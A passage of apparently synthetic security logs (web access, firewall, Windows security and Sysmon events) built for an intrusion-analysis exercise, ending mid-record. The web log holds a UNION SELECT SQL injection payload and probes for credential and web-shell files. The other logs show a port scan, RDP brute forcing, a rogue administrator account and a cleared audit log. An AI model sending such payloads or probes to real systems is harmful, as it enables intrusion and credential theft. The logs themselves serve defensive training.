\"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:49 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 1337 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:52 +0100] \"GET /api/v1/users HTTP/1.1\" 404 3225 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:55 +0100] \"GET /.aws/credentials?id=24 HTTP/1.1\" 404 3981 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:40:57 +0100] \"GET /api/v1/users HTTP/1.1\" 404 1875 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:00 +0100] \"GET /shell.php HTTP/1.1\" 404 1450 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:03 +0100] \"GET /admin HTTP/1.1\" 404 2939 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:06 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 214 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:09 +0100] \"GET /config.php.bak HTTP/1.1\" 404 1859 \"-\" \"sqlmap/1.7.2#dev\"\n203.0.113.9 - - [08/Nov/2026:09:41:13 +0100] \"GET /product.php?id=1'%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 500 1576 \"-\" \"sqlmap/1.7.2#dev\"\n192.168.1.20 - - [08/Nov/2026:09:45:01 +0100] \"GET / HTTP/1.1\" 200 3127 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:47:27 +0100] \"GET / HTTP/1.1\" 200 2993 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:51:35 +0100] \"GET /css/site.css HTTP/1.1\" 200 1224 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:56:32 +0100] \"GET /css/site.css HTTP/1.1\" 200 2056 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:56:57 +0100] \"GET /about HTTP/1.1\" 200 902 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:09:59:29 +0100] \"GET / HTTP/1.1\" 200 3448 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:03:22 +0100] \"GET / HTTP/1.1\" 200 455 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:06:43 +0100] \"GET /index.html HTTP/1.1\" 200 2631 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:08:07 +0100] \"GET /about HTTP/1.1\" 200 3595 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:10:10:48 +0100] \"GET /css/site.css HTTP/1.1\" 200 1842 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:12:36 +0100] \"GET / HTTP/1.1\" 200 1156 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:17:04 +0100] \"GET /index.html HTTP/1.1\" 200 2365 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:20:06 +0100] \"GET /img/logo.png HTTP/1.1\" 200 3970 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:24:10 +0100] \"GET /img/logo.png HTTP/1.1\" 200 3195 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:26:25 +0100] \"GET /about HTTP/1.1\" 200 2227 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:30:50 +0100] \"GET /img/logo.png HTTP/1.1\" 200 1888 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:34:02 +0100] \"GET /css/site.css HTTP/1.1\" 200 3914 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:36:42 +0100] \"GET /index.html HTTP/1.1\" 200 397 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:37:38 +0100] \"GET /img/logo.png HTTP/1.1\" 200 3793 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:41:06 +0100] \"GET /css/site.css HTTP/1.1\" 200 3337 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:10:43:10 +0100] \"GET /about HTTP/1.1\" 200 3036 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:46:03 +0100] \"GET /about HTTP/1.1\" 200 876 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:50:20 +0100] \"GET / HTTP/1.1\" 200 3707 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:10:51:43 +0100] \"GET /css/site.css HTTP/1.1\" 200 2539 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:55:16 +0100] \"GET /index.html HTTP/1.1\" 200 1226 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:10:59:14 +0100] \"GET /css/site.css HTTP/1.1\" 200 3147 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:00:00 +0100] \"GET /img/logo.png HTTP/1.1\" 200 1812 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:03:18 +0100] \"GET /css/site.css HTTP/1.1\" 200 3663 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n10.0.0.5 - - [08/Nov/2026:11:05:02 +0100] \"GET /img/logo.png HTTP/1.1\" 200 366 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:11:09:50 +0100] \"GET /about HTTP/1.1\" 200 2774 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:11:01 +0100] \"GET /img/logo.png HTTP/1.1\" 200 3939 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.20 - - [08/Nov/2026:11:12:03 +0100] \"GET /css/site.css HTTP/1.1\" 200 3648 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:13:04 +0100] \"GET /index.html HTTP/1.1\" 200 3685 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n192.168.1.21 - - [08/Nov/2026:11:16:39 +0100] \"GET /contact HTTP/1.1\" 200 874 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0\"\n", "fw": "Nov  8 09:45:00 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=59839 DPT=882\nNov  8 09:45:00 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=51450 DPT=637\nNov  8 09:45:01 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=53472 DPT=599\nNov  8 09:45:02 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=49950 DPT=998\nNov  8 09:45:03 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=55141 DPT=752\nNov  8 09:45:03 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=55877 DPT=717\nNov  8 09:45:04 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=55306 DPT=920\nNov  8 09:45:05 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=41487 DPT=991\nNov  8 09:45:06 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=56720 DPT=767\nNov  8 09:45:06 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=59353 DPT=70\nNov  8 09:45:07 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=42285 DPT=505\nNov  8 09:45:08 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=42195 DPT=1012\nNov  8 09:45:09 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=40646 DPT=764\nNov  8 09:45:10 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=56618 DPT=254\nNov  8 09:45:10 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=43049 DPT=656\nNov  8 09:45:12 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=49037 DPT=665\nNov  8 09:45:13 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=49974 DPT=298\nNov  8 09:45:14 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=57304 DPT=645\nNov  8 09:45:14 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=47773 DPT=22\nNov  8 09:45:15 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=48816 DPT=417\nNov  8 09:45:15 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=42453 DPT=739\nNov  8 09:45:17 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=52065 DPT=160\nNov  8 09:45:18 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=56761 DPT=649\nNov  8 09:45:19 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=41629 DPT=798\nNov  8 09:45:20 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=49728 DPT=960\nNov  8 09:45:21 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=48839 DPT=407\nNov  8 09:45:22 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=59977 DPT=802\nNov  8 09:45:23 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=52863 DPT=277\nNov  8 09:45:24 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=53097 DPT=867\nNov  8 09:45:25 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=55847 DPT=183\n", "win": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:12Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">admin</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:20Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">admin</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:35Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:50Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">admin</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:00:56Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:09Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">sql</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:14Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">sql</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:24Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">sql</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:38Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:01:50Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">admin</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:02:00Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">sql</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:02:05Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:06Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:17Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:26Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:34Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:44Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4625</EventID><TimeCreated SystemTime=\"2026-11-08T02:20:51Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T02:21:01Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">administrateur</Data><Data Name=\"IpAddress\">198.51.100.23</Data><Data Name=\"LogonType\">3</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4720</EventID><TimeCreated SystemTime=\"2026-11-08T02:25:00Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">svc_backup</Data><Data Name=\"SubjectUserName\">administrateur</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4732</EventID><TimeCreated SystemTime=\"2026-11-08T02:25:20Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">Administrators</Data><Data Name=\"MemberName\">svc_backup</Data><Data Name=\"SubjectUserName\">administrateur</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>1102</EventID><TimeCreated SystemTime=\"2026-11-08T02:40:00Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"SubjectUserName\">administrateur</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T03:12:00Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">203.0.113.66</Data><Data Name=\"LogonType\">10</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T08:50:16Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T08:55:39Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T09:14:16Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T09:21:45Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T10:15:54Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T10:39:45Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T11:42:01Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\"/><EventID>4624</EventID><TimeCreated SystemTime=\"2026-11-08T11:54:57Z\"/><Computer>DC01</Computer></System><EventData><Data Name=\"TargetUserName\">jdupont</Data><Data Name=\"IpAddress\">192.168.1.30</Data><Data Name=\"LogonType\">2</Data></EventData></Event>\n", "sysmon": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T08:31:05.1180000Z\"/><EventRecordID>52000</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 08:31:05.118</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"CommandLine\">&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&quot;</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"ParentProcessId\">6005</Data><Data Name=\"ParentImage\">C:\\Windows\\explorer.exe</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>22</EventID><TimeCreated SystemTime=\"2026-11-08T08:31:09.0690000Z\"/><EventRecordID>52001</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 08:31:09.069</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"QueryName\">intranet.example.com</Data><Data Name=\"QueryStatus\">0</Data><Data Name=\"QueryResults\">::ffff:192.0.2.10;</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T08:33:40.2330000Z\"/><EventRecordID>52002</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 08:33:40.233</Data><Data Name=\"ProcessId\">7504</Data><Data Name=\"Image\">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"CommandLine\">&quot;C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE&quot;</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"ParentProcessId\">6005</Data><Data Name=\"ParentImage\">C:\\Windows\\explorer.exe</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>22</EventID><TimeCreated 